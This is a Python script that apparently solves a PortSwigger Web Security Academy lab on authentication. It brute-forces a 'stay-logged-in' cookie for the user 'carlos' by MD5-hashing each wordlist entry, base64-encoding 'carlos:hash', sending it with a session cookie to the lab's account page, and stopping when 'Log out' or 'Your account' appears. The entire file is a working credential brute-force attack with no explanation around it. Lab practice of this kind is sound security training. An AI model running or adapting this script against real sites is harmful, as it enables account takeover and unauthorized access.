import hashlib
import base64
import requests

#hashing passwords using MD5 hash
#password = "test123"
#hashed = hashlib.md5(password.encode()).hexdigest()

#combo = f"carlos:{hashed}"

#encrypting cookie
#b64 = base64.b64encode(combo.encode()).decode()

url = "https://0af100d804fd3dc080466c8e00cd0030.web-security-academy.net/my-account?id=carlos"
username = "carlos"

#import os

#print("Current working directory:", os.getcwd())
#print("Files in current directory:", os.listdir('.'))

#if not os.path.exists("portswigger_Labs_corr/auth/wordlistCookie.txt"):
 #   print("[-] File not found. Did you put it in the right folder?")
  #  exit(1)

with open("portswigger_Labs_corr/auth/wordlistCookie.txt", "r") as f:
    for password in f:
        password = password.strip()
        hashed = hashlib.md5(password.encode()).hexdigest()
        cookie_value = f"{username}:{hashed}"
        b64_cookie = base64.b64encode(cookie_value.encode()).decode()

        cookies = {
            "stay-logged-in": b64_cookie,
            "session": "amIkTBLhMrlOKwcqU9rHRqLpZRS9EE95"  # Keep your session valid
        }

        response = requests.get(url, cookies=cookies)

        if "Log out" in response.text or "Your account" in response.text:
            print(f"[+] Found! Password: {password}")
            break
        else:
            print(f"[-] Tried: {password}")